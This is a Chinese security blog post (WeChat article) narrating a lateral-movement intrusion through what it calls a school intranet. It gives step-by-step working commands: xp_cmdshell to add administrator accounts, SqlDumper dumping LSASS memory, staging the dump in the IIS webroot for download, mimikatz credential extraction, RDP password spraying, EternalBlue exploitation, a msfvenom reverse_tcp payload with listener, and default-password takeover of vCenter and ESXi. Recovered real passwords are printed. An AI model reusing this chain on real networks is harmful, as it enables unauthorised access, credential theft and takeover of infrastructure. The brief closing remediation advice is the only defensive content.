> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=Mzg2NDU3Mzc5OA==&mid=2247485859&idx=1&sn=e860bd3e277e858a616d67e5d2e9b8e0&source=41#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_gif/0O7ep2c6dwMYyE3oKx2ZyabfeHZpzbUEOBBtUNa6mqsFzZiaj5PxQibTNk1U9PwnHBD3JPF81cXtnTM03hLibjY8A/640?wx_fmt=gif)

听说转发文章

会给你带来好运

在内网中扫描到了几台 sa 权限的 mssql，报备后做了次简单的检测

前期侦察

`Navicat`连上后查看`xp_cmdshell是否存在`

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16mLpRFvjiciasABdibcfcib43jG1cAgKmiaGaicXK8B2ACVo9Uf3BYibfD67KJA/640?wx_fmt=png)

发现存在的

执行`exec master..xp_cmdshell "systeminfo"`发现网卡连接了一个`192.168/16`的内网`IP`

```
主机名:      WIN-XXXXX
OS 名称:     Microsoft Windows Server 2008 R2 Enterprise
OS 版本:     6.1.7601 Service Pack 1 Build 7601
OS 制造商:   Microsoft Corporation
OS 配置:     独立服务器
OS 构件类型:  Multiprocessor Free
注册的所有人:  Windows 用户
注册的组织:      
产品 ID:      00486-001-0001076-84214
初始安装日期:  2016/7/29, 17:27:35
系统启动时间:  2019/8/30, 8:37:41
系统制造商:    Inspur
系统型号:     NF5270M4
系统类型:     x64-based PC
处理器:       安装了 2 个处理器。
             [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~1197 Mhz
             [02]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~1197 Mhz
BIOS 版本:   American Megatrends Inc. 4.1.10, 2016/6/1
Windows 目录:   C:\Windows
系统目录:       C:\Windows\system32
启动设备:      \Device\HarddiskVolume1
系统区域设置:     zh-cn;中文(中国)
输入法区域设置:   zh-cn;中文(中国)
时区:          (UTC+08:00)北京，重庆，香港特别行政区，乌鲁木齐
物理内存总量:     32,648 MB
可用的物理内存:   28,163 MB
虚拟内存: 最大值: 65,294 MB
虚拟内存: 可用:   60,327 MB
虚拟内存: 使用中:  4,967 MB
页面文件位置:   C:\pagefile.sys
域:            WORKGROUP
登录服务器:   暂缺
修补程序:     安装了 2 个修补程序。
             [01]: KB4012212
             [02]: KB976902
网卡:        安装了 2 个 NIC。
             [01]: Intel(R) I350 Gigabit Network Connection
                 连接名:      本地连接
                 启用 DHCP:   否
                 IP 地址
                   [01]: 192.168.122.16
                   [02]: fe80::e436:8d88:315b:25aa
             [02]: Intel(R) I350 Gigabit Network Connection
                 连接名:      本地连接 2
                 状态:        媒体连接已中断
```

`exec master..xp_cmdshell "ipconfig"`

```
Windows IP 配置


以太网适配器 本地连接 2:

   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . :

以太网适配器 本地连接:

   连接特定的 DNS 后缀 . . . . . . . :
   本地链接 IPv6 地址. . . . . . . . : fe80::e436:8d88:315b:25aa%11
   IPv4 地址 . . . . . . . . . . . . : 192.168.122.16
   子网掩码  . . . . . . . . . . . . : 255.255.255.0
   默认网关. . . . . . . . . . . . . : 192.168.122.254

隧道适配器 isatap.{9520CC43-69D2-42A5-99EB-2A1A49B84B34}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . :

隧道适配器 Teredo Tunneling Pseudo-Interface:

   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . : 
```

提权路

`exec master..xp_cmdshell "whoami"`

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16mr567hO3qkw7ia9r23YRZNP7GESUFia9L8gaaPYJibzhlnxiar10rZiaR9Lg/640?wx_fmt=png)

既然是 system，直接`net user asp.net 123456/add && net localgroup administrators asp.net /add`一波带走

远程连上看看

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16mk0YEt4ekWFYqUpqfPpaNa0bmic43jkN2xlJpYrAsHZpQPLq3o08yXag/640?wx_fmt=png)

WTF??? 还有个安全防护软件

那么接下来肯定登不上。。

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16msG76Vw39Q5oCNAA4HEcc80icsInThAyeVR45N6mGKT7047iaNF9K7gibw/640?wx_fmt=png)

换个思路

接下来开始翻资料，梳理下现在的情况

> 1.  MSSQL 数据库 SA 权限
>     
> 2.  有 360
>     
> 3.  数据库以 system 权限启动的
>     

翻资料的时候看到了这个

https://zhuanlan.zhihu.com/p/57800688

> SqlDumper.exe 是从 SQL Server 安装目录下提取出来的，**功能和 Procdump 相似，**并且也是微软出品的，体积远小于 Procdump，也具备一定的免杀功能。SqlDumper.exe 默认存放在 C:\Program Files\Microsoft SQL Server\number\Shared，number 代表 SQL Server 的版本，**参考如下：**
> 
> 140 for SQL Server 2017
> 
> 130 for SQL Server 2016
> 
> 120 for SQL Server 2014
> 
> 110 for SQL Server 2012
> 
> 100 for SQL Server 2008
> 
> 90 for SQL Server 2005
> 
> 如果目标机器没有安装 SQL Server，可以自己上传一个 SqlDumper.exe。

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16m02dJBPnhGve9X4Ss1CQutUCcr88icKGlibluoFZN973E3EicqU5pczoLA/640?wx_fmt=png)

那么查下数据库版本信息

`Select @@version`

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16mH7Hib0qFvSyUoRlYAd2Wia0SK5iayE9m0zqo6VkzPicicj1OMeJ1I56uEww/640?wx_fmt=png)

那么命令应该是`C:\Program Files\Microsoft SQL Server\100\Shared\Sqldumper.exe ProcessID 0 0x01100`

继续查下`lsass`的`pid`

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16mDeePHpuiauibcYnr7o4VGIhd8SPh2r2HUvF5w5JAVEgbGpgXxKtKTu7Q/640?wx_fmt=png)

命令补全后`"C:\Program Files\Microsoft SQL Server\100\Shared\Sqldumper.exe" 608 0 0x01100 0 C:\Users\Administrator\AppData\Local\Temp`

其中，`Sqldumper`原型为`SqlDumper <process id (PID)> <thread id (TID)> <Flags:Minidump Flags> <SQLInfoPtr> <Dump Directory>`

然后执行

```
DECLARE @line sysname
SET @line = '"C:\Program Files\Microsoft SQL Server\100\Shared\Sqldumper.exe" 608 0 0x01100 0 C:\Users\Administrator\AppData\Local\Temp'
EXEC master..xp_cmdshell @line
```

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16muGadf0MVMxoF1gyulwR4wMRThQrjObwp3LwagNEQW38Eb1qjicIvQKw/640?wx_fmt=png)

然后就该读文件了，扫描端口时发现了 iis7 默认页面

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16mbSVDMIQeCCKLicQR2UBJ1sjvkjwT697ZIPRNzwwMflDNbULbiblJUYtA/640?wx_fmt=png)

由于已经 dump 了`lsass`的内存，那么思路转变为利用 IIS7 服务下载`SQLDmpr0001.mdmp`，本地`mimikatz`解密

```
DECLARE @old sysname,@new sysname,@cmd sysname
SET @old = '"C:\Users\Administrator\AppData\Local\Temp\SQLDmpr0001.mdmp"'
SET @new = '"C:\inetpub\wwwroot\SQLDmpr0001.mdmp"'
SET @cmd = 'copy '+@old+' '+@new
EXEC master..xp_cmdshell @cmd
```

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16mSAznTnCvgDJCbP7gJPGLLvdBIpSZMf8O3ibEr1SWDib5gcsx0uOycvGQ/640?wx_fmt=png)

访问看看

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16mFr7zADzLN00XhfUXt1Uw4siafhSWdE12O0UOSNZg51PY5M8tic55LQDw/640?wx_fmt=png)

诶？咋 404 了

换个文件名试试

```
DECLARE @old sysname,@new sysname,@cmd sysname
SET @old = '"C:\Users\Administrator\AppData\Local\Temp\SQLDmpr0001.mdmp"'
SET @new = '"C:\inetpub\wwwroot\test.txt"'
SET @cmd = 'copy '+@old+' '+@new
EXEC master..xp_cmdshell @cmd
```

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16m0Bbcsf2opWbgWHiaPQw6XCE04qyCcjM2ziaNpAWUMr5M0YqTKzj1ViaNA/640?wx_fmt=png)

再访问，下载成功

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16mXtL3b8AvwlXusf0atPWOjb7MhmXWU5MjeNKdMdWVWnIYvic6RXw6ajA/640?wx_fmt=png)

然后扔`mimikatz`一条命令梭哈`mimikatz.exe"sekurlsa::minidumpSQLDmpr0001.mdmp""sekurlsa::logonPasswords full""exit"`

然而事情没那么简单。。

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16mrCWibhFAGWZoGfZwGC66MwAWm8W9xCEtLCE2MPPLCoT0tcvdGmbTNqw/640?wx_fmt=png)

管理员自从上次登录（7 月）后就再也没登录过……

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16m7mQiaibDTyxofKorKkhY6573VWuKIgYaUy3qnUVmJibKrwOE2cWicWtbRA/640?wx_fmt=png)

一筹莫展时发现有个 guest 用户，尝试下另一个思路

``EXEC master..xp_cmdshell 'net user guest /active:yes'``![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16mZPozWHhpMLcghMSQtQSpm1kfC96amliaCvzdCu4IjXkKGKJUge7p5Pg/640?wx_fmt=png)

加密码和管理组

`EXEC master..xp_cmdshell 'net user guest 123456 && net localgroup administrators guest /add'`

然而还是一样

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16msG76Vw39Q5oCNAA4HEcc80icsInThAyeVR45N6mGKT7047iaNF9K7gibw/640?wx_fmt=png)

暴躁老哥在线重启

由于是学校的服务器，而且教学楼时不时断电，于是乎~

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16mibUo6xZMbbqA73xTwry6leemVr2ic7TiazUE8DPJfiaqc63fLlnl1cVc8w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16mdwMcJQiawSrsxdAOujGySyF3mwP1sNjrYnC8hicCCg5IcWuicN9ic66n5w/640?wx_fmt=png)

重启后尝试连接

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16me9micoECibYOXSwpI8P79u4O7NN2FiaMvgdyJv7euVKAX0B12gXwnguIQ/640?wx_fmt=png)

久违的`Win2008` GET！

在拿下了一台内网主机后，将其作为跳板，对`192.168/16`

网段进行了扫描

内网拓扑

先上一张内网环境拓扑图

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16mNdeKb0RyEplgibGVjjxd5vY47YIjbgdzIN12xsqJlpmicXJWWH5U4UMA/640?wx_fmt=png)

经过扫描后，识别出几个重要资产，并将他们作为目标进行针对性的测试

> 192.168.122.8 192.168.122.11192.168.122.12192.168.122.13192.168.122.15192.168.122.16192.168.122.54192.168.122.60

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16mPVUDiazvaglibQHfeEic8FeiaFFD9DZ9Fygxiaiaym3UYCRfLtIMic8LZR1Cg/640?wx_fmt=png)

通过`banner`和`80`端口`title`

识别到的资产如下

`192.168.101.3`-> 锐捷交换机

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16mD1s7MGzR3Gqfb5jiatRWQC65AO9eJVV8MA45HyZCVI6pAFZpOVAZyxw/640?wx_fmt=png)

`192.168.135.1`-> 锐捷 AC 控制器，下联 5 个 AP

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16mtr4uqzWma7nw21XeYxKFeJwkvqgOWpecKoOicTyDVjqKola3cZ1arjQ/640?wx_fmt=png)

`192.168.122.8`->VMware vCenter 主机

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16m8EPic4GkauicCR6IJm8y2OdVLUvwLYXuOrfic2PKkFsDh9Jk7oGKqc1eA/640?wx_fmt=png)

`192.168.122.6`-> ESXi 主机

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16mI0kwbLwu86wEVQuNg8nPKPicaP557dibqGJVkb4Pib8CXM8AFYswHLtXQ/640?wx_fmt=png)

内网大杀器`MS17-010`的扫描结果

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16m7pC7mpEKQeRXYKwkiakBM8RibPnHr1Pia9oibdvzRPKsSzJ0POKbL6K0zw/640?wx_fmt=png)

``攻击路径：10.46.1.16=192.168.122.16->192.168.122.11->192.168.122.15->192.168.122.54->192.168.122.60->192.168.122.8->192.168.122.6``

攻击路径

192.168.122.16->192.168.122.11
------------------------------

使用自行创建的管理员权限的`asp.net`账户登录后，运行`mimikatz`抓到了`administrator`用户的密码

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16mnwrjLAdyyicKqY2rUb8A6ZyFAwdTUGFk7KPqeFbjDcOwNxl7XX8QCGw/640?wx_fmt=png)

然后使用`administrator`用户登录`192.168.122.16`，发现在`mstsc`中有`192.168.122.11`的历史连接记录并且保存了帐号密码，连接上后发现是`administrator`用户，再次抓取`192.168.122.11`密码，发现密码与`.16`的一样，并且在桌面发现了数据库连接密码，保存备用

192.168.122.11->192.168.122.15
------------------------------

由于内网中已有 2 台主机密码一样，将密码做成字典后对`192.168.122.0/24`进行了 RDP 爆破，发现`192.168.122.15`的密码也为`Dell123456`，逐拿下第三台

192.168.122.15->192.168.122.54->192.168.122.60
----------------------------------------------

由于`192.168.122.60`这台主机存在`ms17-010`漏洞，MSF 的代理隧道不稳定，决定利用 BPF 中的`Eternalblue`模块进行攻击，对相关文件进行代理设置后

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16mXib0hmBodcAksGexH3ojCNevYFpwgs7ficLPg6T1LI65nYYrnnaibQmKQ/640?wx_fmt=png)

由 kali 机生成 meterpreter 木马并设置监听

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.16.11.85  LPORT=4444 -f dll >~/backdoor_x64.dll`

```
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lport 4444
lport => 4444
msf5 exploit(multi/handler) > set lhost 10.16.11.85
lhost => 10.16.11.85
msf5 exploit(multi/handler) > run
```

设置好 BPF 后，对`192.168.122.54`进行了攻击并获得了一个`system`权限的 shell  

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16mwNNuibvjWB6RTrXQXY20VZ0ZVibouBtBXhGknGYO4zs3PHUMjPjQfSNg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16mqJayy8icQGkIrLnw4dB04TvqBV2Hh4iaPbgdkyObJPWV5eTfBmHVEChg/640?wx_fmt=png) 随后使用`mimikatz`读密码

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16mJn0tHUE3F5sUUYRDfwHqNYibiabv9Q4wUNmia3JhvYdjHKZjJHiaoohia1Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16m6I8MtXQhwAF1M1vJWPiaiaRtqZfoyxYMWrAZDEEvFShibaJJKbfEjl3fQ/640?wx_fmt=png)

得到密码为`Admin@123`，同样的方法对`192.168.122.60`进行了攻击，密码一样为`Admin@123`，同时 check 出这两台机器为虚拟机

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16mRpOZtW936m3ibBZlQqz46og1D0nicO85VibZZyJ0W6M2ecPJofHfkMGXA/640?wx_fmt=png)

由于内网中存在 2 台虚拟机管理系统，逐将密码保存备用

192.168.122.60->192.168.122.8->192.168.122.6

通过之前的密码分析，推断出管理员有喜爱使用同一密码的爱好，于是大胆猜测 vCenter 主机的密码也为`Admin@123`，登录后确实如此

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16mGIwcicLQWkxaANiacjhXXT6pVz0aOBn3Ieo0B2bRtwGNhOw6joLpSq4Q/640?wx_fmt=png)

由于本人之前部署过`vCenter`和`ESXi`，其默认用户名为`administrator@vsphere.local`和`root`，尝试使用`Admin@123`登录后，两台主机（或者说一台）沦陷

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16mH3Jwia5icuNZElIAMYrQM0FNflssnfoTgrwdudcicgftf4rqBkR7adcQA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0O7ep2c6dwM9R2o7vQEEWjmym0wRW16mxHJmWHK9Lue89FEseRibOFz3TbqmB8oLVyvuYpOQsXHo6pEEAlC2ibjA/640?wx_fmt=png)

修复思路

1.  内网中业务尽量避免使用弱口令
    
2.  多台机器尽量不要用同一个口令
    
3.  高危漏洞及时打补丁
    

**原创文章未经授权禁止转载，谢谢合作**  

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC7IHABFmuMlWQkSSzOMicicfBLfsdIjkOnDvssu6Znx4TTPsH8yZZNZ17hSbD95ww43fs5OFEppRTWg/640?wx_fmt=gif)

● [云众可信征稿进行时](https://mp.weixin.qq.com/s?__biz=MzU5MzIyNTcxNA==&mid=2247484641&idx=1&sn=870601d16337054445289aa3c5b07605&scene=21#wechat_redirect)

● [原创干货 | 记一次拟真环境的模拟渗透测试](https://mp.weixin.qq.com/s?__biz=MzU5MzIyNTcxNA==&mid=2247485151&idx=1&sn=0408ac99394cb0012b228d2b189607a2&scene=21#wechat_redirect)

● [原创干货 | 从手工去除花指令到 Get Key](https://mp.weixin.qq.com/s?__biz=MzU5MzIyNTcxNA==&mid=2247485274&idx=1&sn=daf3f13277dc800eb6e869eefb7f48c0&scene=21#wechat_redirect)

● [原创干货 | 浅谈被动探测思路](https://mp.weixin.qq.com/s?__biz=MzU5MzIyNTcxNA==&mid=2247485411&idx=1&sn=d672dbc2487068bce6d5034330642c7c&scene=21#wechat_redirect)

**·END·**  
 

**云众可信**

原创 · 干货 · 一起玩

![](https://mmbiz.qpic.cn/mmbiz_jpg/0O7ep2c6dwMYyE3oKx2ZyabfeHZpzbUEqWOejXbVs7d9Hag8xrP17e20TDgQ0Qe72S9b8sXHk0GAdCEmnibMd4Q/640?wx_fmt=jpeg)

  

好看的人才能点

![](https://mmbiz.qpic.cn/mmbiz_gif/0O7ep2c6dwMYyE3oKx2ZyabfeHZpzbUEsDhFH0zc75xtAMC0EAtDXLPicgX6pPvk0ZHzR1uCa1KauQlicicp3piciaA/640?wx_fmt=gif)